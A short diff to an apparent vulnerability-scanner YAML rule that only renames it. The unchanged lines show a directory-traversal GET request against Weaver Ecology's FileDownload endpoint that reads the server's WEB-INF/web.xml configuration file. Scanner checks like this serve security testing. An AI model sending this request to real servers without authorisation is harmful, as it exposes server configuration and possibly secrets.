@@ -1,4 +1,4 @@
-name: poc-yaml-ecology-FileDownload-directory-traversal
+name: poc-yaml-ecology-filedownload-directory-traversal
 rules:
   - method: GET
     path: /weaver/ln.FileDownload?fpath=../ecology/WEB-INF/web.xml
